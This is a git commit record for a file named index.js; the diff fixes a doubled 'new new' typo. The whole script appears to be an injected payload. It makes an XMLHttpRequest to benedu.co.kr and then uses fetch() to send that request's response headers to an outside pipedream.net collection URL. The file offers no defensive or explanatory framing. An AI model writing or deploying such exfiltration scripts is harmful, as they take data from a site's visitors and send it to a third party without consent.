a08af26a70e984303099ec849c9fc3a05a26bbc9
as3617 <46442697+as3617@users.noreply.github.com>
2020-03-05 22:58:40 +0900

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,4 @@
-var xhr = new new XMLHttpRequest();
+var xhr = new XMLHttpRequest();
 xhr.open("GET", "https://www.benedu.co.kr/");
 xhr.send();
 fetch('https://encnu1395lyv7.x.pipedream.net/?q=' + xhr.getAllResponseHeaders());
